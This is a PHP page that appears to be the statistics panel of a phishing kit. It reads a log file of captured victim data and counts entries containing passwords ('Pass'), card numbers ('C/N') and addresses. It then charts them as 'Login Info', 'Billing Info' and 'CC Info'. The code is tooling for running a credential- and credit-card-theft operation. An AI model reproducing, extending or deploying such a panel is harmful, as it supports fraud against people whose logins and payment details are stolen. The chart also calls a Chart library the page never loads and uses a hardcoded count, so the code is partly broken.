<?php
$file = '../../assets/logs/bloop.php';

$fp = fopen($file, 'r');
$size = filesize($file);
$content = fread($fp, $size);

$lines = preg_split('/\n/', $content);

$countlogin = 0;
foreach($lines as $line) {
    if(stristr($line, 'Pass')) {
        $countlogin++;
    }
}
$countcc = 0;
foreach($lines as $line) {
    if(stristr($line, 'C/N')) {
        $countcc++;
    }
}
$countadr = 0;
foreach($lines as $line) {
    if(stristr($line, 'Address')) {
        $countadr++;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<!-- Font Awesome -->
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
<!-- Bootstrap core CSS -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
<!-- Material Design Bootstrap -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.7.7/css/mdb.min.css" rel="stylesheet">
<!-- JQuery -->
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<!-- Bootstrap tooltips -->
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js"></script>
<!-- Bootstrap core JavaScript -->
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
<!-- MDB core JavaScript -->
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.7.7/js/mdb.min.js"></script>

</head>
<body>
<canvas id="horizontalBar"></canvas>
<script type="text/javascript">
new Chart(document.getElementById("horizontalBar"), {
    "type": "horizontalBar",
    "data": {
      "labels": ["Login Info", "Billing Info", "Full Info", "Id Info", "CC Info"],
      "datasets": [{
        "label": "All (<?php echo $countlogin;?>)",
        "data": [<?php echo $countlogin;?>, <?php echo $countadr;?>, <?php echo $countcc;?>, 12, <?php echo $countcc;?>],
        "fill": false,
        "backgroundColor": ["rgba(153, 102, 255, 0.2)", "rgba(255, 159, 64, 0.2)",
          "rgba(255, 205, 86, 0.2)", "rgba(75, 192, 192, 0.2)", "rgba(89, 171, 227, 1)",
          "rgba(153, 102, 255, 0.2)", "rgba(201, 203, 207, 0.2)"
        ],
        "borderColor": ["rgb(255, 99, 132)", "rgb(255, 159, 64)", "rgb(255, 205, 86)",
          "rgb(75, 192, 192)", "rgb(54, 162, 235)", "rgb(153, 102, 255)", "rgb(201, 203, 207)"
        ],
        "borderWidth": 1
      }]
    },
    "options": {
      "scales": {
        "xAxes": [{
          "ticks": {
            "beginAtZero": true
          }
        }]
      }
    }
  });
</script>
</body>
</html>